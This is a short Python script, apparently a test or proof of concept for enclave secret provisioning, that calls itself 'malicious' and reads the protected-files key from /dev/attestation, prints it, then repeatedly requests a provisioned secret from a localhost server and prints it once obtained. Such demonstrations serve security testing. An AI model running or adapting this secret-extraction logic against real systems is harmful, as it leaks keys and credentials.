#!/usr/bin/env python3

import ctypes
import time
print("Hello from malicious world")

f = open("/dev/attestation/protected_files_key", "r")
base_pwd = f.read()

print("Password read received from PRELOAD lib: <{}>".format(base_pwd), flush=True)

lib = ctypes.cdll.LoadLibrary("/lib/libsecret_prov_attest.so")

while True:
    ret = lib.secret_provision_start(ctypes.c_char_p(b"localhost:4433"), ctypes.c_char_p(b"server/certs/cert.pem"), ctypes.c_void_p(0))
    if ret < 0:
        continue

    mem = ctypes.POINTER(ctypes.c_ubyte)()
    size = ctypes.c_int()

    ret = lib.secret_provision_get(ctypes.byref(mem), ctypes.byref(size))
    if ret < 0:
        continue
    pwd = ""
    for i in range(size.value - 1):
        pwd += chr(mem[i])

    if pwd != base_pwd:
        print ("Mischief managed: password received: {}".format(pwd), flush=True)
        break

    time.sleep(5)